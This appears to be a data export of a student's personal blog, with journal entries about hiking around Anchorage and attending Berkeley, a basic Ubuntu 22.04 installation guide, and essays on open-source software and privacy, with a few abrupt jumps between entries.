Island\\\n![](https://cdn.jimchen.me/FtbuenJDo4FlOt1saxOMFsDXNgV9cPBdBsaJARBFHKwe7_9Bb_vbioXllGw6p6xzQH9_GKXB-8fKcqU5vUWnPiRVmbUuIDEbQReqq5QHw4l50-pG_uxLbGa4r1WKoOMt50kuZwLJzgUfgcRCVd4oQQC6D4RiZSgeGKSJVEv_Kfs5254dqVKhtC-MwIGXWg=s800)\\\n\\\nResurrection Bay\\\n![](https://cdn.jimchen.me/07kY4lDZKqykaPGmDFsBZI9WNtPwEVrMYs-0gUVz5PiZjXDU1xuLuJvniWs7fH1rMbWZj1C9Vvxs0mAPmJnFIAj1lS_15nhNF1A1IQk5tvt0ZILmUt5OvobfiPdSpIs9WMv65cy08IMrFZOebZL_eU69ybebodRQXyOCLalVfot2BSj-fKcGhAggmOCbLw=s800)\\\n\\\nHolgate Glacier\\\n![](https://cdn.jimchen.me/JTmd0bPkCK2gxei4P-ynhT8SCEnyPkO4evRrCmdVn01aicEILiyuAGlHiw8M2gBm8ND3NuC2pHyDeNRu0JgZ8uA465sdLpl-6O8_JrAFkh7I87cuxZi1h8v5OfWwrI3l01Eue0hx1fpOogZ1OK-OYKe1yAkS5uOHnsKXQR98jELg26C1_5rp4oGv6U-RkA=s800)\\\n\\\nHarding Icefield\\\n![](https://cdn.jimchen.me/JZechodUbr0a6057X0NecSgFfdzPurc4_QP4Sym7TikDUN3M-7VHYkVy80CZJS2JHAh_jG730Hu-Huap7wbir0UR8Vt4HiH04ICLCEmDcYuYm-T-Wx2oYKRQbJZiQwX0jywfmNifTsXpQyUWVnd5mnLHVGoMAFRCpJFJCSedEPPfp3B-q9qPjwdF-UDP9w=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/yohVcog3SbhqSR9r6j8P0m9Ntjsn1Ql07JeBSfxgO4MCNzTPhx2MrSAC2wQIWb7YFrPxtiQYfTkE_IF_4b1bnVpVcNalOUqzdkPTj3nP6meEVW9ztXuzkfejxrzkGVZsEgJSEZhJgRWsrV3jCiuObV0e5Pp7htG3c5b-nOAG7QP2xh3riFa3MnpjbMOZqw=s800)\\\n\\\nThe car I Hitchhiked in\\\n![](https://cdn.jimchen.me/36rU-Q-itKe3so5CkEtnMl3yJ4dLh2NKT1eLxP7awlz1LL6eknt2mfz1RTBhG_xRfZcs3N8cF2dlwGOQLfGxc7DyobZGA8ZqDJe0SGDrpk3Uc4C8q0peFq80ygvyT8zp5_PENTejmePSjWJcFNKWH9ahMszPJi6URXsqS9vmdTAp-j_VbCymigeMotkZSQ=s800)\\\n\\\nWaterfall Switchback Trail\\\n![](https://cdn.jimchen.me/fhvAPQFl3Gv0wemWJcoMisVYd6RuaKhihNz6nVLuQl6VTPjGE72fmh0QhcTQ_EfNLM1oaEZy2zmLiG85H-neOWiuksJWK49bWqyPX3PHuXXk6lzrIA2QqS7ki74zCsaIsNBHCH6aNuqB3_xsi2Kq9gigovkmrMBQ6Jvuhgh8ShGZ0zPPlvt1sSj-YzeiJQ=s800)\\\n\\\nSummit Lake\\\n![](https://cdn.jimchen.me/qgvIiDNdy3J_sQPzCcLYkNzAHCpdmCM0f8YZgSnE3EvTMgxVZGwSiEMbkKM_s_e2Wqe3J8DXH9vOH3BvFkovolaU7CzdB4RL53lKTbTlntqehbh8EtyCkNg52d2H--tYL81hNNYgVoULv-Fc1PMttgIutEWzaP_Ba-B24PVCWGXJQanX1MKjRLSGYhZleA=s800)"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec3"}, "title": "Visiting Anchorage", "date": {"$date": "2023-05-16T19:40:00Z"}, "type": "journal", "access": 1, "body": "## 514\n\nToday I stayed at Anchorage.\n\nI previously planned to go to Seward tomorrow but it seems like there\nare no tickets left, so I am going to Seward the day after tomorrow. I\nslept pretty much all morning, and went to downtown in the afternoon. I\ndropped my bag off at the hotel, and carried my backpack. I first\nplanned to go to downtown, but the road wasn\\'t suitable for walking and\nit was like 3 miles to downtown, so I ended up taking a bus. The bus is\nvery convenient, though.\n\nThe views is spectacular, in fact, I am sure I won\\'t be amazed by\nnormal sceneries. The scenery in Alaska in just on another level\naltogether. I could see mountains covered with ice in Delaney Park, and\nsee all the way to the other side of Knik Arm.\n\nIt was hot today, and I ended up with only 1 layer of clothing and\ntaking 3 on my hands, thinking it was hot. As a result, I got tired soon\nfrom walking, and my feet was sore. I went around and got into a visitor\ncenter, where I chatted with 3 people for a while, then went to visit\nthe museum. But I was sore, so after a quick visit I went back and\nchecked in at the airbnb.\n\nThe airbnb is much much better than the hotel, with only half price.\n\nThere are almost no homeless people in Alaska. There are few black\npeople, but all taxi drivers and bus drivers I encountered are black.\nPeople here are friendly, and some will stop and say hi and I walked by.\n\nI went to the Earthquake Park and Point Woronzof Beach. It was long\nwalk. I went there from the Lake Spenard, and it was so beautiful. I\nalso saw helicopters.\n\nIt was hard to walk since there are almost nobody walking and cars\ndominate the road, however, the view was spectacular.\n\nI like the beach in Anchorage, which is more than 30 degrees north in\nlatitude to beaches in california. I ended up getting back on Lyft since\nI was too tired to walk.\n\n### Photos\n\n\\\nMidnight Sunset outside Ted Stevens Airport\\\n![](https://cdn.jimchen.me/ziFcv5ZsgLjhYD617bDNTDJfhhmuTkauZfGxHQ1LJ8vSZk0IVO9-ijWBU0KGHVBQpUm2XaJgexR6AFaooOwlL5gxUw-fn7r9aw2lLfaYPz5LGIHMWXDAWYCjHVHaA8k6C84RiD3b9sSrKZN1ucCs8dM=s800)\\\n\\\nDowntown Anchorage\\\n![](https://cdn.jimchen.me/F6wXRJVFI6Ptl38ABdm6eE61G_RczPGKoRPq8BzhVBYRGknj8rDb1KjubeTqwcnChYVntlkeKgCBxWLn0JZTw-H12giOjtND0Rc429gSSJmcw1BjTOCFpSSzK_6X8CHzz2ycxyW_xLFOtBeA7IIk_0Y=s800)\\\n\\\nNorth Coastal Trail\\\n![](https://cdn.jimchen.me/6bO8bwF0nU_sZ7fSq_xQpJ1dhr_oJibqpbnHRFVTA60e6lWa5FV4JeHHVyRZEHcdpWppiC5mkXI87s1zBzLOdlSf0yBxNtVYb6iGyIL0U1fZqcvpvyOsLXO_icoRDOjB475vlRzLfiOExA2KG0yQXnc=s800)\\\n\\\n![](https://cdn.jimchen.me/UEEh1Y3EdsAwbPy3XusxQe2LbOwTVvEKbrj1pEQBca3BXBAuSOM5AJqh0P8p73ArAT2EjAwYeAK_0Vyadqe5K_-e4_bvq2qocRAeHklTONTuQFpJOWqwRgH-AdcUkrtxq02jmITFxZjpHRK3cxeEa_M=s800)\\\n\\\nDelaney Park\\\n![](https://cdn.jimchen.me/4HA1DgZMkepbqJ9aTV9tyXJUQH6uYWks0GCUib99NCT9YM31GMC2i9dVDiFOqrtLobZpafNfSi_oG3F-eUakKpfW09vSDfg23NtftNGokHXYi5fJtkCHN0-2Js1EKMrfUaNcjXKzIXoC0UGsuEsoOVA=s800)\\\n\\\nAnchorage Museum\\\n![](https://cdn.jimchen.me/dhNOyNW6iEdHEdF0cJCUxb-7yhC2abIxJmDEtYSeF7FrUKmTuc1546X7-gg3vDt51dPb5sKSVvBp-CMkdZYa88CeXU4pnCir_yqB_lZ0caL8jHJcdnO733lhwyeXhhclir1hxQMoB8cqk1gTJxwG0M8=s800)\\\n\\\nLake Spenard\\\n![](https://cdn.jimchen.me/gLRo7wHXL_SDR6t_lsZbD7DUw80xahqs3Z7bhRTSQnI0HV35mEEjnsAaaJ8i8_PIRente6PF9qhSgG9xPAvgFnldXfelq2auH8EjUBaYGpnFUDwSUeMQqvl1f__6IypYmfzqUDW9fcoANsYJjmyaqJQ=s800)\\\n\\\nLake Hood Seaplane Base\\\n![](https://cdn.jimchen.me/POCFrlqWzxVwwXh0_3654zEmyE81lMOxVGc9mcj8IcA9P-b9tnVUZjSS3SaSa9fSJoKATcI6MnP2zO_-bvKFgDBKyzPvsQnYP2eCXlfcQQFlXPZSLoHwV3Cn7lpVHrPiRMILrOgbkjP84dK3qHexzXQ=s800)\\\n\\\nEarthquake Park\\\n![](https://cdn.jimchen.me/8XBN8bi8Om1S7ZQ8hbSz7XCQzFoUVPevDZwV2ZLwehZl5zu_xM2C9VTe5xhA29dJWaakAZ9mcNRpMSohoGnAW05CnAvgxwSl4K0NbNc58B5xR_nNYxqd84Fg_Oc559HoXDeKzdABC1iFKz9ESIpvuZM=s800)\\\n\\\nPoint Woronzof\\\n![](https://cdn.jimchen.me/yZ4mtTmCPJGSmNTU9JgAcoE3h2ZZhp4PCXqA6rdVhW7Gc4tYDrRmFFthkJmCYrPADhKfW-eikldeXltzgrNKNOUXtJkb7Ef-xn7t0eWhUSl3Mf_ptNUDLDNC_wPMm4M-QtG5VeKdhWSlhiOrE37PGzQ=s800)\\\n\\\n\\\n![](https://cdn.jimchen.me/eLhbim1OVZ3g9wBBS6ci8JdTRX3rxZRQpo4mLYh54vOcFkvFS7oMWHffEg35ofD6zcypjED_awtLCoHwVRmeJZr7Vi0rJhr-mblHfVqfj7OfYrrX7o4V4xa35HsoSS_EW4AmCr-WFTQdOYo-ZNqy_WU=s800)\\\n\n## 515\n\nToday is 515.\n\nI slept all morning because for strange reasons I wasn\\'t sleeping early\nlast night, and I realized how poorly planned my travel is. I didn\\'t\neven finish booking for the tickets. I spend two hours at noon booking\neverything and trying to wrap things up, but turns out that I am\nspending so much money on this trip. I booked an airbnb in Seward for a\nquite expensive price, and it didn\\'t even include storing luggage after\ncheking out and shuttle, so I had to do everything myself.\n\nI initially planned to take a bus to midtown, but for some reasons the\nbus didn\\'t come, and in Google Maps it also didn\\'t show that the bus\nis coming, so I ended up taking a lyft.\n\nI took a lyft to midtown and hiked around. The driver was chatty, and we\ntalked for a while. He told me his son is also a sophomore studying\neconomics at Boston with full scholarships, which I thought is much\nbetter than me, although he wanted his son to study engineering. He also\ntold me he grew up in orange county, and how he thought Europe is better\nthan US because of homeless problem. Overall he is very friendly guy. He\nmentioned that Puffin Inn is really bad, and there are shootings and\nshady people. I told him about my school and life too. The ride was too\nshort for a long chat, and we parted at Cuddy Park.\n\nCuddy Park is mostly empty and there is a big lawn, but on the other\nside there are worn-down tents. That is the first time I saw\nhomelessness in Alaska.\n\nMidtown is very dirty, and poorly constructed, the roads almost wild and\nnot suitable for pedestrians to walk. I walked very hard and constantly\nlooked at my phone. Then I walked to Chester Creek and walked along the\ntrails. There are also many other people walking and cycling on the\ntrail. Goose Lake is very beautiful, it is blue and I could see the\nsnowy mountains above the lake. There are some dogs from other people\nwhich got me scared, though. But everything turned out all right.\n\nThen I went to University of Alaska, Anchorage. I thought the campus is\nvery beautiful. In many places in China, the trees and grasses and lawns\nlooks as though they are artificial\\--human made for recreation and\ngreeness. However, this campus looks as though it is constructed out of\na natural reserve. The campus is big and there are parking lots\neverywhere. In contrast, Berkeley looks dense and crowded. But I know\nthis is not the kind of university my parents would gladly let me go to,\nalthough I think it is really nice. I went into several school\nbuildings, which are open to the public, and got some water. There are\nalmost no people in the campus, and every building is connected to a\nparking lot. It is really hard to get around without a car. There is a\nfigure skating podium in the university and I think it is nice. Anyways\nAnchorage is much nicer than Berkeley but of course my parents won\\'t\nlet me go there for school or anything like that so there is no question\nafter all. Maybe I can come and be a teacher here after graduation, and\nwith a car I can go to glaciers and National Parks every weekend. Ah,\nimagine that.\n\nThen my legs got really sore and I had to go. I went to Lake Otis. There\nis some park called Jacobson Park without a road on the map, and I went\nin through a wild trail. The trail was so bad that half of it is wet,\nthen I saw someone with a tent. I hadn\\'t thought it strange and I was\nlike \\\"Sorry\\\", and then I saw that there are no roads ahead I was like\n\\\"I am turning back\\\". Then I heard him say something like \\\"Can you\nspare me a dollar?\\\", and I got kind of scared, but since I am not sure\nI just kept going away at a faster pace.\n\nI walked around and it seems that the roads there are consists of\npopular university names like Duke, Stanford, Princeton, but there are\nno Harvard or Berkeley, which is strange. People were watering their\nlawns and a elderly woman said hi to me, which I replied the same back.\nBut by the time I almost couldn\\'t continue walking. I sat on the ground\nnearby and called lyft.\n\nThen I decide to call it a day since I am leaving early morning\ntomorrow, and it is really hard for me to get up early, so I must\nprepare well. On the lyft back the driver chatted with me, and he asked\nmy information and I told him I was getting A or A- or B+ this semester,\nand he was like \\\"everything is A+, you should work harder\\\". And I\nthought again just how lazy I am, and how I would try to work harder\nnext semester, which is merely a thought in my head for pretty much all\nmy life. He also told me how he was feeding those homeless in Anchorage\nand there are 300 in total, some of them die of frost in winter. He said\nhe could take me around town and I told him I wanted to go to Kincaid\nPark, but since it is ordered in Lyft we just finished the trip and\nparted. Both lyft drivers aren\\'t black this time.\n\nI ate at subways three times in two days (I only had 5 meals in total),\nbut I think it is pretty nice.\n\nAfter two days of hard hiking I think I saw the equivalent of half a day\nof car driving, however, I think that walking is another unique\nexperience anyways.\n\n### Photos\n\n\\\nAirbnb Malibu Road\\\n![](https://cdn.jimchen.me/OZCFzQfT-VjNfnhIhwIwnH4YYWy9Nw1sGzmajYCSb6GUo9MZ0lkknK7669MDSFT3pMjIYnVHB-Vvc5gZy_RYVE2fjm4ZyyVNoQGniJbmQM63ErPbhKpCtF7M0Mr-kwj-tNGor0xrByaKEsFBlw2WGsU=s800)\\\n\\\nMidtown: Homeless in Alaska\\\n![](https://cdn.jimchen.me/h36i8c-zqrnX7Z08xT5A9sp_EUAsPiBAez9d2dGWQFbcKFH6sok1ASqAy6Upe51Z69SuNKiTQR0JF3cfTqY7T-HXejG-mp_5iawLflWxWm9rAV0DgjZN5P-bb_q21ApNEtxD96WFaSijmxaK-MGM_9Q=s800)\\\n\\\nGoose Lake\\\n![](https://cdn.jimchen.me/EXVEXhuD9QDDBo3TUscDYdeDpJXPGp34D9iVRNdzS9VJGDbTXTQQyyvhwZ1i2GXfzzwbKuYLlUcZQ4el2hWLxTYZUb7DdQAGnUgHce5Px38B0dTT5qxxFj5bHAtDHIg5CR2ppXLYc4VMNySi00T_BH4=s800)\n\nUniversity of Alaska Anchorage\\\n![](https://cdn.jimchen.me/kvAk_gFW0WgsfMSySaNVBldsls9rCPbyW31jFenHlWGd-YFmy7n6kMv6VLygorl3_jzzjLTLoDzMnC1afolyhVvuNnqpiYGGd9KzWOhl2HJgjOzsygNeiVukB2ThmH8E8r7nV0gxHZ7U5u50Gh9DKBg=s800)\\\n\n![](https://cdn.jimchen.me/VzSGkJ7A5Eyl9vVBzbv9AWBVHxl3O1to-Yriu97yLexhEBb44LVg_IigPVkYXk64njM95bMXZgZQDPOY9krQM5oboCPio72YCCnokX45HRrILCf-k0f98oi90hN3_JtTpbiVe-WOOLxXbccGeURtW04=s800)\\\n\n![](https://cdn.jimchen.me/flcIzTSKFrtdfGwueNaOU_z9zPbQKolzyV1ZARrNuIX7I788MxQzZuPdXKmaG19yg_zNOGAubQZ3IrcUFKWK6uruzTvfxWGSlquQ6t9I7ulP_YvA0qRq1prnvC3n_OS7tgkQZqyaY7_cE6dz0FsxpTo=s800)\\\n"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec4"}, "title": "Booting Ubuntu 22.04", "date": {"$date": "2023-04-13T11:52:00Z"}, "type": "linux", "access": 1, "body": "Windows is heavy, slow, and hard to clean up. Installing Ubuntu 22.04 on my own laptop took me a lot of time. This article describes this process.\n\n## 1. Put your data on a cloud\n\n## 2. Download the iso image to USB\n\nHere is the link: ubuntu.com/download/server\n\nIt is 1.8 GB large. Download it and move it to a usb, (you can use rufus on windows or balenaetcher on linux, whatever)\n\n## 3. Boot the server from startup\n\nKeep clicking f2 and f12 or whatever or\n\n```sh\nsudo systemctl reboot --firmware\n```\n![alt text](https://cdn.jimchen.me/83661910-6385-44dd-b5b9-a80d6eea2c8e_image.png)\nThen you will enter a page like this:\n\n![alt text](https://cdn.jimchen.me/1537ea18-4946-4e42-82a3-41259cada16a_image-1.png)\nIn my case the KingstonDataTraveler 2.0 is the USB, so disable the other HDD device, then save and exit, then you will enter a menu like (this isn't my own picture but it is similar enough)\n\n![alt text](https://cdn.jimchen.me/2043113f-a521-4773-bbad-7921e27d19f8_image-2.png)\n\n## 4. Install it\n\nJust go step by step, remember to connect the wifi in the process because it is hard for me to connect to wifi in scratch in the terminal. Mainly just click ok, The time of installing the system varies, and sometimes takes quite a long time.\n\nThen remove the usb and boot the pc again, you shall enter ubuntu 22.04.\n\n## 5 Install GUI\n\nWhen first booting into ubuntu, it may be a terminal without gui. You can't even use the mouse. I choose lightdm but anything is fine\n\nsudo apt install lightdm\nsudo apt install ubuntu-desktop\nreboot\nThen it will boot into a desktop\n\nYou get a beautiful computer\n\n![alt text](https://cdn.jimchen.me/54f8fcb2-e7e1-4925-aba9-8f384d6239c3_image-3.png)\n\n## 6.

However, WeChat doesn't.(electronic WeChat doesn't work) I don't usually use WeChat on computer but it is just interesting to see how it works. You can use wine to do exe files on linux servers. But wine is hard to configure, and the newest version can't load.\n\n![alt text](https://cdn.jimchen.me/fbb7b7a5-a526-4ba2-b7da-5c4cf111e8dc_image-8.png)\n![alt text](https://cdn.jimchen.me/e60bbba5-0995-494b-9f7e-4ad0e4cadb90_image-9.png)\n![alt text](https://cdn.jimchen.me/5cace29c-3988-4d61-b183-88a4a678a70b_image-10.png)\nSome other version of WeChat worked, though.

I think that I adapted\npretty well to USTC. I don\\'t know why I am thinking that.\n\nWhat I think is that, basically, I think I know what to do at USTC. I\nmean, I even think I am pretty well off there. I don\\'t even think there\nwould be a problem if it wasn\\'t for the covid restrictions and mass\ntesting. The only thing would be that I was kinda bored. But that\ndoesn\\'t matter cause I had been feeling bored for half a decade. I\nthink I got used to that kind of life and identity now.\n\nIf I am back in USTC right now, I would be living in my house on the\n32nd floor and preparing for my exams. Then I would try coding and doing\ncool stuff about computer science. I mean, I don\\'t even see a problem\nthere, strangely.\n\nI know exactly what to do in China. I know exactly what to do at USTC. I\nfound my identity. I can follow the path down the road. I don\\'t need to\nthink that much. I will achieve my goals.\n\nI don\\'t know what to do if I am in another Chinese university, like\nthose universities with equal gender ratios. I seriously don\\'t. But we\nlike USTC, and we don\\'t talk about them.\n\nI mean, back then, when I was saying USTC sucks, I didn\\'t even know\nwhat it feels like outside in this unfriendly world. USTC isn\\'t\nfriendly in some aspects, but there is a way to solve these problems and\nget along with life, right?\n\nI don\\'t know. I will probably see this post, like, one year later and\nsee what I would be thinking.\n\n## The Path I Had Planned\n\nBut I am here, and there is no going back.\n\n1 Studying CS courses\n2 Doing school work\n3 Running and hiking\n4 (Optional) Expanding my own blog and doing fiction and film reviews\n\nThat\\'s it. I would be fine in my undergrad years\n\nBack then, in middle school, when I desperately wanted to know the\noutside world, I couldn\\'t. I learned to adapt to the learning\nenvironment and everything.\n\n## Realizing the Need for Change\n\n\\\"The bridge is crossed, so stand and watch it burn. We\\'ve passed the\nPoint of no return.\\\"\n\nWhat I would be doing back in USTC is seemed well off.\n\nI build this fantasy in my imagination, and it is wrong.\n\nI need to find a new community here."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec6"}, "title": "Class is starting, and I am getting ready", "date": {"$date": "2023-01-17T10:42:00Z"}, "type": "journal", "access": 1, "body": "## Current State of Mind\n\nIt has been a while since I posted, and Class is starting tomorrow.\nToday is Martin Luther King Day. Everybody takes a day off.\n\nToday is a fine day, the sun shining bright and clear sky. But it is\nvery windy. I did almost nothing, just playing and wasting time all day,\nlike every other day.\n\nTomorrow my classes are starting. I am so afraid that I cannot\nunderstand the class materials.\n\n## Personal Thoughts and Challenges\n\nMy housemates are just moving in. There weren\\'t very talkative,\nspending most of their time in their rooms.\n\nMy fourth finger hurts a little on the edges, but it\\'s like no big\ndeal.\n\nI mean, now I still haven\\'t got many friends. My social life is so\nstrange starting from middle school. I really want to have some people\nto talk to and hang out with. I mean, it sucks to be alone.\n\nI know that learning is the only thing that I should actually do. I know\nthat I still suck. But seeing people my age hanging out with friends\njust makes me kinda feel so lonely, you know. Sometimes when you go to a\nconcert or a show alone, and you don\\'t enjoy and walk out. But if you\ngo to see a drama with someone else, it gets so interesting.\n\nMost of the time, I am telling myself that learning is the only\nimportant thing that matters in my life. If not, then why should I go to\nShibei instead of SMIC? Why should I go to UCB to exchange instead of,\nlike, UCI? My parents cared about this thing a lot. I have thought about\nnothing more, and here\\'s my conclusion. I am still so bad, and I should\nkeep learning my priority and ignore other stuff.\n\nMy sleeping schedule is still strange, I mean, the bed doesn\\'t make you\nvery sleepy, so I ended up spending much time trying to fall asleep and\nwondering nothing.\n\nTomorrow my schedule will be more packed, and I think this semester will\nbe the most unique one in my life.\n\nThere are many things I hope to achieve, but I doubt that I will make\nany one of them. It was just that, you know, how uncontrollable I am.\n\n## Life at Berkeley\n\nBerkeley is a beautiful place, and foothill is a yummy cafeteria. I\ndon\\'t care what other people are saying, but the dining hall food is\nenjoyable. I guess that I just enjoy almost any food, except those very\nspicy, salty stuff.\n\nWindows became very slow. I hate it when it becomes like that. I mean,\nLinux computers are much faster and easier to use without having u wait\na thousand years to load some basic features.\n\nToday I went to Edward\\'s Stadium and saw a group of students. Actually,\nit wasn\\'t kids. They look quite old. I mean, not old, but mature. They\nlook much more mature than me, and I believe that they may be a few\nyears older than me.\n\nI believe that by focusing on academics, I can enjoy life and be less\nanxious, achieving a sense of serenity. But I am so stupid and lazy. I\nreally hope I change someday.\n\n## Looking Ahead\n\nOh, and by the way, I am just trying to get up early. I mean, I have to\ngo to morning classes at 8 am, so I have to get up before 7, right?\n\nIt was like climbing mountains, just going to the classrooms and\nlibrary.\n\nI also want to run, but somehow I had classes every day at 5 pm, so I\ncan\\'t join the Cal Running Club. I want to run myself on Edward\\'s\nStadium, but it was, like, usually closed. Many people here wear shorts\nin this freezing 50 F winter, and some of them aren\\'t even fat. I feel\nso cold sometimes.\n\nI dunno what else to say in this log."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec7"}, "title": "Not Gonna Use Windows Anymore", "date": {"$date": "2023-01-14T21:23:00Z"}, "type": "linux", "access": 1, "body": "Let\\'s Go!\n\nLinux so cool\n\nI am still a noob :)\n\n## Update 2023.2.1\n\nI formatted Windows, so Windows don\\'t exist on my computer anymore.\n\n## Update 2023.10.4\n\nBeing a person like [Richard Stallman](https://stallman.org/) is too\nmuch for me. For instance, I need to use phones, or else I will\nhave difficulty surviving in this world nowadays.\n\nBut anyway, I decided to take a small step towards Open Source &\nSecurity.\n\n### How?\n\nSo basically almost all my applications on the computer(archlinux) are open\nsource now, I made this switch.\n\nGoogle Chrome -\\> Chromium\\\nVS Code -\\> OSS Code\\\nGoogle -\\> DuckDuckGo\\\nYouTube -\\> Invidious\\\nMSOffice-\\> OnlyOffice\n\n### Crappy Social Media\n\nThen I decided to almost completely stop using Twitter, Reddit, Discord,\nTelegram. The reason is that there are no healthy things on Twitter and\nno knowledge of all of them. Twitter is just a toxic and malicious area\nfilled with adult content and nothing useful. Similarly Reddit and\nTelegram is filled with adult content, addictive and toxic, very\nunhealthy, and full of garbage. Discord is boring and full of gaming,\nlike full of rubbish. The only reason I am still using Instagram is\nbecause some people I follow are on Instagram, but then I decided to\nonly use Instagram on my phone since I think it is more of a phone app.\nSocial media is just bad for me.\n\n## Things with no Alternatives\n\nGmail has no alternative since it is the Berkeley mail and I must use\nthat.\n\nSome very crappy Chinese software cannot be replaced after I go back to\nChina.\n\n## Updates 2024.6\n\nThese days I value simplicity and practicality.\n\n## Fine with Proprietary Software\n\nI have no problems with proprietary software because they are unavoidable and many of them are superior, and avoiding them only makes my life harder. However those proprietary software still need to respect the user to a certain extent. There is no point in avoiding Google Chrome and established platforms like social media.\n\nBesides companies need to earn money and it is reasonable if they are hiding some competitive edges in their code.\n\n## More of a Hobby\n\nMany of those things, e.g., device exploration, niche open source softwares, are more of a hobby than an actual daily use case. Some of them have slow speeds, and not modern practices.\n\nThey can be very interesting hobbies, however, most situations our times are more important and can be utilized to do other things, and they are mostly not suited for daily usage.\n\nFor example, if you tinker with Linux too much, you may risk bricking the system. I bricked my system at least 3 times, either when the boot partition got corrupted or the fstab got misconfigured. It is awfully frustrating and not constructive in daily life.\n\n## Security and Privacy, Does it Matter?\n\nI realized I don't really care about my security and privacy that much. There is no point in avoiding YouTube or Gmail intentionally as they are still the best platforms out there. Practicality, in fact, is a far more important concept.\n\nPeople's information is everywhere with a click, especially in the United States. Go to any people's search platforms and you can see people's addresses and phone numbers, it is just insane how much information is already leaked. Someone with a Python bot can crawl millions of people and addresses from these websites, and even if you take them down or hide them from public view, they are still there.\n\nMoreover, my passwords are already stored safely in KeePass, and one platform breaching them doesn't leak my other platform's randomly generated long unguessable passwords.\n\nAs for privacy or data, it doesn't matter if companies sell them or not because most of them are already available anyway, and for a person void on social media, I don't get a lot of advertising.\n\nI appreciate Google because it gives so much free space and YouTube is so free, not charging anything for its CDN costs. I would be willing to pay for YouTube for the CDN and bandwidth cost, though. That said, Google is also an optional platform and doesn't force everybody to use it. These big companies are pioneers in open-source projects(except Apple it seems). Without these top companies designing excellent open source projects, my life would be a lot harder though.\n\nSo called \"private DuckDuckGo\" browser went down when Bing's API had a problem, so it implies DuckDuckGo relies heavily on Bing for search results, and that implies it is not that private anyway.\n\nI don't blindly use any Google Service but it is a very great tool. Google Docs or Slides are the most convenient office suits out there. They can even be used offline in a browser.\n\nAfter all, sticking to strict open source guidelines won't improve my tech skills, just very niche things isolating me more from the society I am already isolated from.\n\nMoreover, in China, the government knows all about your data.\n\nCompanies selling my data don't endanger me in any way, as I am just a regular person. I would, of course, avoid plain-word passwords or plain-word bank accounts or identification numbers.\n\nMaintaining a practical approach instead of debating about what is ideal is very beneficial.\n\n## Why Don't I Use Some Services?\n\nI don't use some services not because they are proprietary. I was mistaken in my previous approach and I am now emphasizing the utility. I am not using some services because of other reasons.\n\nI don't use some social media because they feel overwhelming not because they are proprietary. Similarly, I also quit Mastodon and Pixelfed from Fediverse, as they contain views that are too polarizing and not constructive.\n\nI don't like TikTok not because of privacy reasons but because I just don't like short videos, people can have choices and preferences.\n\nThere are, however, still some services I might not be contented with. For example, BaiduNetDisk requires downloading a client to download any files(which in turn not only bloats the system but always shows a floating icon, which I find annoying). It simply doesn't respect the user. BaiduNetDisk also restricts the free tier downloading speed to 50 KB per second, absolutely ridiculous and egregious behavior from the company. I thought the network speed depends on my Internet's bandwidth and the Company's server's bandwidth, and it lacks transparency and respect for its users.\n\nSimilarly, I really dislike CSDN because it hides the copy paste functionality with some stupid Javascript intentionally, forcing users to log in. These acts doesn't benefit the company but forces the users to pay or log in. Copying code can be done easily from the browser debug console anyways. They simply disregard the need to benefit the users, instead, focusing on maintaining a dictatorship and autonomy, without actual benefits or superior quality, which makes me annoyed.\n\nI don't use Proton anymore because the bridge is too hard to configure, forcing the user to stick to the Proton Mail Client when using it. Furthermore, Proton is also proprietary. While popular and overall a very good app, it provides no advantage over Gmail.\n\n## Why Don't I use Windows now?\n\nI don't use windows not because it is proprietary. I like the Google Services on Android though, which are proprietary too. I dislike Windows because it isn't ideal for development and lacks a good package manager, hides too much things through GUI. I don't know what is going on down inside it and using Ubuntu is just faster. I went back to Ubuntu simply because the usage experience is almost the same for me as ArchLinux, I don't notice any difference except package management, in which case I add debs instead of using AUR. I use Ubuntu primarily because most servers use Ubuntu, giving me a seamless transition between my laptop and servers, and in turn, making my life easier.\n\n## About \"Recall\"\n\nI don't like the idea of Microsoft Recall which takes screenshots every few seconds, not because it is a leak of privacy or security breach, but because I find it unnecessary, and doing so probably makes my battery consume more power.\n\nThat said, I am still very enthusiastic about the SnapDragon Elite Chip, and if I can run Linux on it seamless I would be willing to use that.\n\n## Why Don't I use Apple?\n\nI don't like Apple not because it is proprietary. In fact, I do like Apple's interface. Apple has so called \"clean\" and \"minimalistic\" interface and style.\n\nI don't like Apple because it always create a mysterious or magical atmosphere with its products, usually causing confusion to me. Furthermore, I bricked every Apple device I got with either jailbreaking or removing the recovery shell.\n\nI value utility, ease of use, and actual transparency, basically \"user's freedom and flexibility\", on the products I use, which Apple fails to address(being a walled garden). You can't even run MacOS on non Mac devices(or some people might but it's not a wide practice)\n\n## Toxicity in Open Source Community\n\nThere is often a \"toxic\" superiority in open source community that goes like \"I am superior than you because I use open source\", but actually meaningless. Some people believe they are superior because they use \"ArchLinux\", which isn't quite true. While ArchLinux usually requires some command line proficiency to install, Ubuntu can also be installed via command line and tinkered extensively. There is no superiority between operating systems and only utility and widespread usage.\n\nThat said, these people neither represent the open source community nor does that implicate that open source community is toxic as a whole. In fact, I find many people very friendly and constructive. Open source community was the reason I got interested in technology, and I would be forever grateful for it leading me in the early days I studied computer.\n\nIn fact, Microsoft contributed so much to the open source community, including VSCode and Typescript, which are essential tools for today's developement. Downplaying big company's contributions for niche applications is wrong.\n\n## Conclusion\n\nBasically these things are part of my guidelines at least for now\n\n- Superiority and Practicality\n- Flexibility and Freedom\n\nIn the end it's all about personal choices."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8dec8"}, "title": "Visiting Berkeley High School", "date": {"$date": "2023-01-12T22:23:00Z"}, "type": "journal", "access": 1, "body": "Today I went to BHS for a visit; I mean, I basically sneaked into the\ncampus for a whole morning.

I was not getting involved\nanyhow with their daily life, and I have no friends here. I really want\nto interact or just communicate with some of these students about their\ndaily life and what they like, just anything. This kind of life feels\nforeign to me, and as a 17 yo, I really want to join in the conversation\nand have a various life in high school. Walking down the noisy hallway,\nI felt like I could blend in easily with the school community. Problem\nis I had almost no conversation today at that school.\n\nWhen you don\\'t know about anything and have no idea of what people are\nlike, and have no idea of what life is gonna be, you really kind of lose\na sense of direction and have no motives. Why do I want to do this?\nSometimes I wish I do not study at a university but in high school\n\\'cause that was supposed to be the right place for me, and they were\nsupposed to be unforgettable years. But from another\\'s perspective, I\nwas more than lucky, and they envied me so much, being able to escape\nfrom the sad reality.\n\nI always feel a sense of loneliness at university. I feel like not being\nactively involved in anything. After so many days, I finally came to 